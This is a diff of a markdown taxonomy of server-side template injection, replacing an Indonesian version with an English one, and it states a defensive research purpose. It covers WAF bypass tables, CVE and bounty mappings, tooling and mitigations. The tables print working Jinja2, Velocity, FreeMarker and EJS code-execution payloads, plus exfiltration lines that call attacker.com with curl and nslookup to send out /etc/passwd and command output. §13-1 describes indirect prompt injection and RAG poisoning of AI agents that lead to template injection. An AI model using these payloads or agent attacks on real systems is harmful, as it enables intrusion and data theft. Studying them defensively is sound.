+| **Operator overloading** | Some Python operator methods (`__add__`, `__mul__`) accessible from sandboxed types | Sandbox blocks attribute access but not operator expressions |
+| **Format string filter** | Jinja2 `%` operator on strings: `"os.popen('%s').read()%" % 'id'` evaluated as a format operation | Format operator accessible in sandbox; constructs callable string |
+
+### §11-4. WAF-Level Bypass Techniques
+
+Web Application Firewalls inspect payloads for template syntax. Bypass techniques exploit the gap between WAF inspection logic and the template engine's parser.
+
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **Whitespace injection** | Inserting spaces, tabs, or newlines inside expression delimiters: `{{ 7 * 7 }}` vs `{{7*7}}` | WAF matches exact patterns without whitespace normalization |
+| **URL encoding** | `%7B%7B7*7%7D%7D` for `{{7*7}}` — decoded by server before template evaluation | WAF inspects raw URL bytes; server decodes before rendering |
+| **Double URL encoding** | `%257B%257B7*7%257D%257D` — server double-decodes before rendering | Two decoding passes in request pipeline (proxy + application) |
+| **Content-type switching** | Payload delivered via `multipart/form-data`, `application/json`, or `text/xml` instead of `application/x-www-form-urlencoded` | WAF inspects only specific content types |
+| **Header-based payload delivery** | Payload in `X-Custom-Header`, `User-Agent`, or `Referer` when only body is inspected | WAF does not inspect all HTTP headers for template syntax |
+| **Parameter pollution** | Duplicate parameter: `?name=safe&name={{7*7}}` — WAF validates first, app uses second | Multi-value parameter handling differs between WAF and framework |
+
+---
+
+## §12. Blind SSTI and Out-of-Band Exfiltration
+
+When template output is not reflected in the HTTP response (e.g., PDF generation, email rendering, background jobs), exploitation requires alternative feedback channels.
+
+### §12-1. Time-Based Detection
+
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **`sleep()` / `time.sleep()` probe** | Jinja2: `{{''.__class__.__mro__[1].__subclasses__()[396](['sleep','10'],...)}}` — measures response delay | No output reflection; server processes payload synchronously |
+| **Velocity time delay** | `#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('sleep 10'))$ex.waitFor()` | Java-based engine; same timing principle |
+| **Error-based differentiation** | Boolean-based pair: one payload evaluates correctly, one introduces a syntax error; different response sizes/codes confirm injection | Subtler timing channels unreliable; error codes more deterministic |
+
+### §12-2. DNS-Based Out-of-Band Detection
+
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **`nslookup` shell command** | Jinja2 MRO chain → `popen("nslookup attacker.com")` | OS execution confirmed; DNS traffic less filtered than HTTP |
+| **Subdomain data exfiltration** | `popen("nslookup $(whoami).attacker.com")` — command output embedded as DNS subdomain | DNS logging on attacker server (Burp Collaborator, Interactsh, custom DNS) |
+| **Java DNS trigger** | FreeMarker: `${"freemarker.template.utility.Execute"?new()("nslookup attacker.com")}` | FreeMarker engine; any Java exec primitive |
+| **HTTP callback** | `popen("curl http://attacker.com/?data=$(cat /etc/passwd | base64)")` | HTTP outbound not firewalled; larger data can be exfiltrated |
+
+### §12-3. Error-Based Extraction
+
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **Verbose error message reflection** | Injecting invalid syntax that triggers a descriptive error message containing file paths, variable values, or stack traces | Debug mode enabled; error handler reflects raw exception message |
+| **Error-based boolean** | FreeMarker: `${1/((expr)?string('1','0')?eval)}` — divide-by-zero only if expression is false | Engine supports conditional arithmetic; error message style differs for true/false |
+| **Stack trace leakage** | Payload causing `NullPointerException` or `KeyError` that reveals internal class names and file paths | Unhandled exceptions propagate to HTTP response |
+
+---
+
+## §13. Emerging and Hybrid Mutation Surfaces (2024–2025)
+
+### §13-1. AI-Assisted Template Generation Sinks
+
+As LLM-powered features are embedded into web applications, new surfaces emerge where AI output is rendered through template engines without sanitization.
+
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **LLM-generated content as template source** | AI output fed directly to `render_template_string()` without escaping; attacker influences AI output via prompt to inject template syntax | Application uses LLM to generate template code or HTML, then renders it server-side |
+| **RAG context injection** | Malicious content in a RAG knowledge base includes template expressions; when retrieved and rendered in a template, they evaluate | RAG system retrieves untrusted external content; retrieved text used in template context |
+| **Indirect prompt injection → SSTI pivot** | Webpage contains hidden template expressions; when AI agent summarizes or processes the page, it incorporates the expressions into a template render call | AI agent with webpage-reading capability and template rendering in its output pipeline |
+
+### §13-2. CMS and E-Commerce Plugin SSTI
+
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **Grav CMS plugin injection** | CVE-2024-28116 — Grav's flat-file CMS uses Twig; admin-accessible template fields allow Twig SSTI leading to RCE | Authenticated admin access to Grav; Twig evaluation of user-editable template fields |
+| **OFBiz `ProgramExport` endpoint** | Apache OFBiz's `/webtools/control/ProgramExport` endpoint executes Groovy scripts; OGNL/Groovy sandbox incomplete | CVE-2023-49070, CVE-2023-51467, CVE-2024-32113, CVE-2024-38856, CVE-2024-45195 chain — each patch bypass reveals same root cause |
+| **WordPress template plugin injection** | WordPress plugins that offer "custom template" features sometimes pass shortcode content or widget text through PHP template engines | Plugin-specific; depends on whether eval or template engine is used for rendering |
+
+### §13-3. Prototype Pollution → EJS SSTI
+
+A specific escalation path where a prototype pollution vulnerability in a Node.js application is pivoted into SSTI via EJS template engine options.
+
+| Subtype | Mechanism | Key Condition |
+|---------|-----------|---------------|
+| **`outputFunctionName` pollution** | Prototype pollution sets `Object.prototype.outputFunctionName` to `_a;return global.process.mainModule.require('child_process').execSync('id');//`; EJS reads this as a template option | EJS `renderFile()` or `render()` called after prototype pollution; EJS reads options from `__proto__` |
+| **`escape` function poisoning** | Polluting `Object.prototype.escape` to a function that executes OS commands; EJS uses this function for output escaping | EJS escape function poisoned via prototype chain before render call |
+
+---
+
+## Attack Scenario Mapping (Axis 3)
+
+| Scenario | Architecture | Primary Mutation Categories |
+|----------|-------------|---------------------------|
+| **Unauthenticated RCE** | Public endpoint, template parameter exposed, no auth required | §1-1, §4-4 (OGNL), §7-2 (CrushFTP) |
+| **Authenticated admin RCE** | Admin panel with template customization features | §10-3 (template editor), §6-1 (Twig admin), §13-2 (Grav CMS) |
+| **Blind SSTI via email/PDF sink** | Background template rendering, no HTTP reflection | §12-1, §12-2, §10-1 (stored) |
+| **Second-order stored exploitation** | User data persisted, rendered later in admin/report view | §10-1, §12-2 |
+| **WAF-protected target** | WAF in front of vulnerable app; payload must bypass signature inspection | §11-1, §11-2, §11-4 |
+| **Java enterprise app RCE** | Spring Boot / Struts 2 / Apache OFBiz deployment | §4 (FreeMarker, OGNL, SpEL) |
+| **Python/Flask microservice RCE** | Flask/Django application exposing `render_template_string()` | §3, §1-1, §11-1 |
+| **Node.js SaaS application** | Express.js with Handlebars/EJS/Pug templates | §5, §13-3 |
+| **Cloud/container escape** | SSTI yields shell → pivot to cloud metadata endpoint (SSRF via template) | §3-1 + SSRF chain |
+| **Prototype pollution pivot** | Client-side prototype pollution escalated to server-side SSTI | §13-3 |
 
 ---
 
 ## CVE / Bounty Mapping (2023–2025)
 
-| Kombinasi Mutasi | CVE / Kasus | Produk | Dampak / Bounty |
-|---|---|---|---|
-| §4-2 (Twig sandbox bypass) + §3-2 (built-in abuse) | CVE-2024-28116 | Grav CMS < 1.7.45 | Authenticated RCE. Modifikasi runtime config untuk whitelist `system()` |
-| §4-2 (Twig sandbox regex bypass) | CVE-2025-66294 | Grav CMS < 1.8.0-beta.27 | Authenticated RCE via nested `evaluate_twig()` melewati regex sanitization |
-| §3-2 (Twig built-in) + §6-2 (CMS double render) | CVE-2025-32432 | Craft CMS 3.x–5.x | **Unauthenticated RCE (CVSS 10.0)**. ~13,000 instance rentan, ~300 compromised. Metasploit module tersedia |
-| §4-1 (FreeMarker sandbox bypass) + §3-1 (`?api`) | CVE-2023-49964 | Alfresco | Authenticated RCE via ClassLoader chain melalui built-in `?api` |
-| §4-1 (FreeMarker application utility abuse) | CVE-2024-48962 | Apache OFBiz < 18.12.17 | CSRF + SSTI mengarah ke RCE via `GroovyUtil.eval()` melalui hash FreeMarker `Static` (memerlukan authenticated user interaction) |
-| §3-1 (FreeMarker `?new`) | CVE-2016-4462 | Apache OFBiz 13.07.03 | RCE via instantiate class `Execute` |
-| §4-3 (Thymeleaf denylist gap) | Reported 2024 | Spring Boot 3.3.4 | RCE via `MethodUtils` (commons-lang3) melewati package denylist Thymeleaf |
-| §4-4 (Pebble sandbox bypass) | GHSL-2020-050 | Pebble Templates | RCE via bypass case-sensitivity `getClass()` (< 3.0.9) |
-| §5-1 (EJS compilation pollution) | CVE-2022-29078 | EJS | RCE via `opts.settings['view options']` pollution |
-| §5-1 (EJS `outputFunctionName`) | CVE-2024-33883 | EJS < 3.1.10 | RCE via prototype pollution → `outputFunctionName` injection |
-| §1-1 (Direct PHP execution) | CVE-2024-22722 | Form Tools 3.1.1 | RCE via template injection dalam field Group Name |
-| §3-1 (FreeMarker) | CVE-2024-41667 | OpenAM <= 15.0.3 | RCE via FreeMarker template injection |
-| §4-2 (Twig sandbox bypass) | CVE-2024-28118 | Grav CMS (Twig) | RCE via unrestricted Twig extension class access |
-| §7-1 + §2-1 | Bug Bounty | Undisclosed | Bounty $1,200 untuk SSTI `{{6*200}}` yang mengarah ke RCE |
-| §2-1 (Config globals) | HackerOne #423541 | Shopify (Return Magic) | SSTI via Jinja2 dalam third-party integration |
-| §6-2 (SaaS Placeholder Injection) | Zendesk Placeholder Injection (Rikesh Baniya, 2024) | Zendesk | User info extraction via menyuntikkan platform template placeholder (misalnya, `{{ticket.requester.email}}`) melalui differential sanitization subject-to-description; system me-render injected placeholder dengan PII victim dalam automated response context |
-| Cross-ref: Expression Injection | Unrestricted SOQL Endpoint Exfiltration (Securitum, 2024) | Salesforce | Data exfiltration via unrestricted SOQL query endpoint tanpa parameterized binding; expression-based injection analog dengan SSTI dalam query language Salesforce (lihat `salesforce-lightning-platform-security.md` §2) |
+| Mutation Combination | CVE / Case | CVSS / Bounty | Impact |
+|---------------------|-----------|---------------|--------|
+| §4-4 (OGNL injection) — unauthenticated | CVE-2023-22527 (Atlassian Confluence) | CVSS 10.0 | Unauthenticated RCE; exploited for cryptojacking (2024) and ELPACO-team ransomware (mid-2024); 62-hour dwell time before ransomware deployment |
+| §7-2 (VFS SSTI — sandbox escape) | CVE-2024-4040 (CrushFTP) | CVSS Critical | Unauthenticated file read outside VFS; auth bypass to admin; RCE chain; exploited in the wild |
+| §13-2 (OFBiz OGNL/Groovy chain) | CVE-2024-45195 (Apache OFBiz) | CVSS High | Unauthenticated RCE; patch bypass of CVE-2024-32113 + CVE-2024-36104 + CVE-2024-38856; CISA KEV |
+| §13-2 (OFBiz OGNL — auth bypass) | CVE-2023-51467 (Apache OFBiz) | CVSS 9.8 | Authentication bypass + RCE via in-memory payload; surge in exploitation attempts Jan 2024 |
+| §13-2 (Grav CMS Twig) | CVE-2024-28116 (Grav CMS) | High | Admin-authenticated SSTI in Twig via page/template fields; leads to OS RCE |
+| §4-1 (FreeMarker SSTI — plugin) | CVE-2025-26865 (Apache OFBiz ecommerce plugin) | Critical | FreeMarker SSTI via ecommerce plugin; unauthenticated RCE in affected versions |
+| §4-4 (OGNL/Groovy — OFBiz scrum) | CVE-2025-54466 (Apache OFBiz scrum plugin) | Critical | Code injection in scrum plugin; unauthenticated exploitation |
+| §10-1 (Stored SSTI — OFBiz ecommerce) | CVE-2022-25813 (Apache OFBiz) | High | Stored SSTI via "Contact us" Subject field; triggered when party manager views communications |
+| §2-2 (Double eval — Spring Boot Thymeleaf) | Pentest (modzero 2024) | N/A (private) | Referer header → Thymeleaf preprocessing double-eval → unauthenticated RCE on Spring Boot 3.3.4 |
+| §4-3 (SpEL — Spring Boot error page) | Bug bounty writeup (2022, Akamai WAF bypass) | $5,000+ (estimated) | SpEL injection in error page parameter; WAF bypassed via encoding |
+| §3-1 (MRO chain — Jinja2/Flask) | HackerOne: Uber rider.uber.com SSTI | $10,000+ bounty (historical reference) | Jinja2 SSTI in Flask app parameter; RCE demonstrated |
+| §13-3 (Prototype pollution → EJS SSTI) | Multiple HackerOne reports (2023–2024) | $2,000–$15,000 | Prototype pollution escalated to RCE via EJS `outputFunctionName` option |
 
 ---
 
-## Detection Tools
+## Detection and Tooling Matrix
 
-### Offensive Tools (Scanner & Exploiter)
-
-| Tool | Tipe | Target Scope | Core Technique |
-|---|---|---|---|
-| **SSTImap** | CLI scanner/exploiter | 15+ engine (Jinja2, Twig, Smarty, Mako, dll.) | Automated detection, identification, dan exploitation dengan interactive mode |
-| **Tplmap** | CLI scanner/exploiter | 15+ engine | Automated SSTI detection dan exploitation; predecessor ke SSTImap |
-| **TInjA** | CLI scanner | 44 template engine di seluruh 8 bahasa | Polyglot-based detection dan identification menggunakan Hackmanit Template Injection Table |
-| **Burp Suite Scanner** | Commercial proxy | Multiple engine | Built-in SSTI detection rule dengan active scanning |
-| **Nuclei SSTI Templates** | Template-based scanner | Multiple engine | YAML-based detection template untuk automated scanning |
-| **PayloadsAllTheThings** | Payload repository | Semua engine major | Comprehensive payload collection yang diorganisir berdasarkan engine dan bahasa |
-
-### Defensive Tools & Resources
-
-| Tool | Tipe | Target Scope | Core Technique |
-|---|---|---|---|
-| **Template Injection Table** | Interactive reference | 44 engine | Polyglot → engine identification mapping (Hackmanit) |
-| **Template Injection Playground** | Testing environment | Multiple engine | Docker-based lab untuk testing payload SSTI secara aman |
-| **Semgrep SSTI Rules** | Static analysis | Multiple framework | Pattern-based detection dari unsafe template rendering dalam source code |
-| **TEFuzz** | Fuzzer (penelitian) | PHP template engine | Menemukan 55 exploitable sandbox bypass dalam 7 PHP engine |
-| **AngularJS CSTI Scanner** | CLI scanner | AngularJS 1.x | Automated client-side template injection detection |
-
-### Research Resources
-
-| Resource | Tipe | Cakupan |
-|---|---|---|---|
-| **PortSwigger Web Security Academy** | Interactive labs | SSTI detection, identification, exploitation, sandbox escape |
-| **HackTricks SSTI** | Reference wiki | Comprehensive engine-specific payload documentation |
-| **GoSecure Template Injection Workshop** | Training material | Hands-on workshop mencakup multiple engine |
+| Tool | Type | Target Scope | Core Technique |
+|------|------|-------------|---------------|
+| **SSTImap** (vladko312) | Offensive scanner | 15+ engines; Python, Ruby, PHP, Java, Node.js | Polyglot probing + interactive sandbox escape; based on Tplmap with interactive mode and blind injection verification |
+| **Tplmap** (epinna) | Offensive scanner | 15+ template engines; eval()-like injections | Automated SSTI detection and OS shell extraction; sandbox break-out via MRO/reflection chains |
+| **TInjA** (Hackmanit) | Offensive/research | 44 template engines; CSTI + SSTI | Novel polyglot generation; engine fingerprinting table covering 44 engines; both server and client-side |
+| **Backslash Powered Scanner** (PortSwigger) | Burp extension | Reflected inputs | Differential analysis of server responses to syntax variations; detects non-obvious injection points |
+| **tplmap Burp plugin** | Burp extension | Jinja2 / Python-focused | Integration with Burp Suite intruder/scanner for targeted SSTI probing |
+| **Interactsh** (ProjectDiscovery) | OOB callback server | All blind injection types | DNS/HTTP/SMTP callback server for blind SSTI confirmation; open-source Burp Collaborator alternative |
+| **Burp Collaborator** | OOB callback service | All blind injection types | DNS/HTTP/SMTP interaction logging for confirming blind SSTI via out-of-band channels |
+| **WAFW00F** | WAF fingerprinting | Pre-attack recon | Identifies WAF vendor; informs which bypass category (§11-4) to prioritize |
+| **Hackmanit Template Injection Playground** | Research/testing | 44 engines | Sandboxed browser environment for testing polyglot payloads against real engine instances |
+| **Jinja2 SandboxedEnvironment** | Defensive | Python/Jinja2 | Restricts access to `__class__`, `__mro__`, dangerous dunder attributes; mitigates §3 attacks |
+| **Twig Sandbox Extension** | Defensive | PHP/Twig | Whitelist-based function/method/property access control; mitigates §6-1 attacks |
+| **ModSecurity + OWASP CRS** | Defensive WAF | Generic signature-based | Detects `{{`, `${`, `<%`, `__class__`, `__import__` patterns; bypassable via §11 techniques |
+| **Semgrep / CodeQL SSTI rules** | SAST | Source code analysis | Identifies `render_template_string(userInput)`, `Razor.Parse(userInput)`, `ERB.new(input).result()` anti-patterns at CI/CD time |
 
 ---
 
 ## Summary: Core Principles
 
-### The Fundamental Problem
+**The fundamental enabling property** of the entire SSTI mutation space is the architectural conflation of data and code. Template engines are Turing-complete interpreters — they were never designed to receive untrusted input as *source code*, only as *data bound to predefined variables*. The vulnerability class exists because developers, under time pressure or without security training, choose the convenient `render_template_string(f"Hello {name}")` path over the safe `render_template("template.html", name=name)` path. Every mutation in this taxonomy is a variant of the same substitution: the attacker inserts delimiters (`{{ }}`, `${ }`, `<%= %>`, `@( )`) that the engine treats as evaluation triggers rather than literal text. The diversity of mutations reflects the diversity of engines, contexts, defensive layers, and runtime environments — not fundamentally different vulnerability classes.
 
-Server-Side Template Injection ada karena template engine **dirancang untuk Turing-complete** (atau near-complete) — mereka harus mendukung complex logic, iteration, function call, dan object access untuk memenuhi peran mereka dalam web application rendering. Expressiveness inheren ini menciptakan tension yang tidak dapat direkonsiliasi antara template functionality dan security ketika input untrusted memasuki template evaluation pipeline.
+**Why incremental patches fail** is visible in the Apache OFBiz record: four separate CVEs (CVE-2024-32113, CVE-2024-36104, CVE-2024-38856, CVE-2024-45195) between May and September 2024 represent four iterations of the same patch — each fixing a path traversal variant that bypassed the previous fix — because the underlying issue (unauthenticated access to the `ProgramExport` template execution endpoint) was never eliminated, only obscured. Similarly, Jinja2's `SandboxedEnvironment` has been bypassed repeatedly because the sandbox restricts *attribute access* but cannot block the fundamental Python MRO, operator overloading, or format-string mechanisms that remain available in restricted contexts. Encoding bypasses (§11-1), filter bypasses (§11-2), and WAF evasion (§11-4) all exist because signature-based defenses model payloads as fixed strings rather than as syntactic structures.
 
-Root cause bukan bug dalam engine individual manapun tetapi **category-level design flaw**: conflation dari data dan code dalam template rendering. Ketika input pengguna digabungkan ke dalam template source (daripada di-pass sebagai safe data parameter), template engine tidak dapat membedakan antara logic yang dimaksudkan developer dan directive yang disuntikkan attacker. Ini secara struktural identik dengan SQL injection dan command injection — confusion "data as code" yang sama yang telah mengganggu computing sejak awalnya.
-
-### Why Incremental Fixes Fail
-
-Pendekatan sandbox — denylists, allowlists, method restrictions — telah berulang kali di-bypass di seluruh setiap template engine major (§4). Sejarah menunjukkan pola yang konsisten: (1) sandbox diimplementasikan, (2) researcher menemukan bypass via reflection, ClassLoader access, atau application-specific object graph, (3) bypass di-patch, (4) bypass baru ditemukan menggunakan entry point yang berbeda. Arms race ini berlanjut karena sandbox mencoba membatasi bahasa Turing-complete ke subset "yang aman" — masalah yang secara provably undecidable dalam kasus umum.
-
-Survei 2024 menemukan bahwa **31 dari 34 template engine yang dipelajari mengizinkan atau telah mengizinkan RCE**, dan hanya **10 dari 34 menawarkan bentuk proteksi apa pun**. Bahkan di antara mereka dengan proteksi, penelitian bypass secara konsisten menemukan jalur escape baru, terutama ketika template beroperasi dalam framework yang kaya (Spring, Express, Laravel) yang mengekspos extensive object graph.
-
-### The Structural Solution
-
-Satu-satunya defense yang reliable terhadap SSTI adalah **tidak pernah mengizinkan input untrusted menjadi bagian dari template source code**. Ini berarti:
-
-1. **Parameterized templates**: Pass user data secara eksklusif melalui API data-binding template engine (`render_template(template, data=user_input)`), tidak pernah melalui string concatenation ke dalam template source.
-2. **Logic-less templates** (Mustache, Handlebars dalam strict mode): Gunakan template engine yang secara deliberate membatasi expressiveness untuk mencegah code execution — meskipun bahkan ini telah di-bypass via prototype pollution (§5).
-3. **Immutable template sources**: Pastikan template di-load hanya dari file yang trusted, developer-controlled — tidak pernah dikonstruksi dari input pengguna saat runtime.
-4. **Defense in depth**: Bahkan dengan correct template usage, terapkan output encoding, Content Security Policy, dan principle of least privilege untuk membatasi blast radius jika kerentanan diperkenalkan.
-
-Insight paling penting dari taxonomi ini adalah bahwa **mutation space adalah unbounded** — setiap template engine baru, framework integration, dan library dependency memperkenalkan jalur eksploitasi baru. Strategi defender yang hanya sustainable adalah untuk menghilangkan injection vector sepenuhnya, bukan untuk enumerate dan memblokir individual payload.
-
----
-
-*Dokumen ini dibuat untuk tujuan defensive security research dan vulnerability understanding.*
+**The structural solution** requires eliminating the code/data conflation at the framework level: (1) never pass user-controlled strings as template *source* — always pass them as template *parameters*; (2) prefer logic-less template engines (Mustache, Handlebars in non-helper mode) where the engine's evaluation capability is architecturally constrained; (3) apply SAST rules at CI/CD time to detect dangerous sink calls (`render_template_string`, `ERB.new().result()`, `Razor.Parse()`, `env.from_string()`) that receive user input; (4) for second-order injection surfaces (§10-1), apply sanitization at the point of storage rather than at the point of rendering; and (5) for Java enterprise environments with multi-layer rendering pipelines (Struts/OFBiz — §4-4), enforce the principle that OGNL expressions must never originate from HTTP request parameters at any point in the pipeline, regardless of authentication state.
 
 ---
 
 ## References
 
-- Kettle, J. (2015). "Server-Side Template Injection: RCE for the Modern Web App." Black Hat USA 2015. https://portswigger.net/research/server-side-template-injection
-- Hackmanit. "Template Injection Table." https://cheatsheet.hackmanit.de/template-injection-table/index.html
-- Hackmanit. "TInjA: Template Injection Analyzer." https://github.com/Hackmanit/TInjA
-- SwisskyRepo. "PayloadsAllTheThings: Server Side Template Injection." https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
-- Vladko312. "SSTImap: Automatic SSTI Detection Tool." https://github.com/vladko312/SSTImap
-- Epinna. "Tplmap: Server-Side Template Injection Detection and Exploitation." https://github.com/epinna/tplmap
-- Check Point Research. (2024). "Server-Side Template Injection: Transforming Web Applications from Assets to Liabilities." https://research.checkpoint.com/2024/server-side-template-injection-transforming-web-applications-from-assets-to-liabilities/
-- Hildebrand, M. "Improving the Detection and Identification of Template Engines for Large-Scale Template Injection Scanning." Master Thesis, Hackmanit.
-- Ackcent. "In-depth Freemarker Template Injection." https://ackcent.com/in-depth-freemarker-template-injection/
-- Sartor, S. (2024). "CVE-2024-48962: SSTI with Freemarker Sandbox Bypass Leading to RCE." https://www.sebsrt.xyz/blog/cve-2024-48962-ofbiz-ssti/
-- modzero. (2024). "Exploiting SSTI in a Modern Spring Boot Application (3.3.4)." https://modzero.com/en/blog/spring_boot_ssti/
-- Munoz, A. & Mirosh, O. (2020). "Room for Escape: Scribbling Outside the Lines of Template Security." Black Hat USA 2020.
-- Ethical Hacking UK. (2024). "CVE-2024-28116: Server-Side Template Injection in Grav CMS." https://ethicalhacking.uk/authenticated-server-side-template-injection-with-sandbox-bypass-in-grav-cms/
-- YesWeHack. "Server-Side Template Injection Exploitation with RCE Everywhere." https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
-- HackTricks. "SSTI (Server Side Template Injection)." https://book.hacktricks.wiki/pentesting-web/ssti-server-side-template-injection/
-- Intigriti. "Server-Side Template Injection (SSTI): Advanced Exploitation Guide." https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-server-side-template-injection-ssti
-- ArXiv:2405.01118. (2024). "A Survey of the Overlooked Dangers of Template Engines." https://arxiv.org/html/2405.01118v1
-- OnSecurity. "Method Confusion In Go SSTIs Lead To File Read And RCE." https://onsecurity.io/article/go-ssti-method-research/
-- Securitum. "Server Side Template Injection on the Example of Pebble." https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/
-- Mizu. "EJS - Server Side Prototype Pollution Gadgets to RCE." https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce
-- GitHub Security Lab. "GHSL-2020-050: Arbitrary Code Execution in Pebble Templates." https://securitylab.github.com/advisories/GHSL-2020-050-pebble/
+1. Kettle, J. (2015). *Server-Side Template Injection: RCE for the Modern Web App*. PortSwigger / Black Hat 2015.
+2. Brumens (2025, March). *Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere*. YesWeHack / Ekoparty 2024.
+3. Philippe, L. 'BitK' (2022, September). *Template Injection On Hardened Targets*. DEF CON 30.
+4. Awali, M. (2024, November). *Template Engines Injection 101*. Medium / @0xAwali.
+5. Korchagin, V. (2026, January). *Successful Errors: New Code Injection and SSTI Techniques*. PayloadsAllTheThings Reference.
+6. Hildebrand, M. (2023, September). *Improving the Detection and Identification of Template Engines for Large-Scale Template Injection Scanning*. Hackmanit.
+7. modzero (2024). *Exploiting SSTI in a Modern Spring Boot Application (3.3.4)*. modzero.com.
+8. SCH Tech (2024). *Razor Pages SSTI & RCE*. schtech.co.uk.
+9. Atlassian (2024, January). *CVE-2023-22527: Critical RCE Vulnerability in Confluence Data Center and Server*. CVSS 10.0.
+10. CrushFTP (2024). *CVE-2024-4040: VFS Sandbox Escape / SSTI*. CVSS Critical.
+11. Emmons, R. / Rapid7 (2024, September). *CVE-2024-45195: Apache OFBiz Unauthenticated RCE*.
+12. Apache OFBiz Security (2025). *CVE-2025-26865: FreeMarker SSTI via ecommerce plugin*.
+13. Notin, C. (2020). *Server-Side Template Injection in ASP.NET Razor*. clement.notin.org.
+14. Oligo Security (2025). *Safe by Default or Vulnerable by Design: Golang SSTI*. oligo.security.
+15. Check Point Research (2024). *Server-Side Template Injection: Transforming Web Applications from Assets to Liabilities*.
+16. Wallarm (2024). *CVE-2023-22527 Exploitation Analysis*.
+17. GitHub Blog / Security (2023). *Bypassing OGNL Sandboxes for Fun and Charities*.
+18. OWASP Foundation. *Testing for Server Side Template Injection (OTG-INPVAL-018)*.
+19. swisskyrepo / PayloadsAllTheThings. *Server Side Template Injection* (maintained repository, accessed 2025).
+20. HackTricks / book.hacktricks.xyz. *SSTI (Server Side Template Injection)* (maintained reference, accessed 2025).
+21. arxiv.org (2024, May). *A Survey of the Overlooked Dangers of Template Engines* (arXiv:2405.01118).
+22. YesWeHack (2025). *Bug Bounty Report 2025: SSTI/CSTI Hunter Tips from Top Hunters*.
+
+---
+
+*This document was created for defensive security research and vulnerability understanding purposes. All techniques described are documented in public security research, CVE disclosures, and bug bounty writeups.*
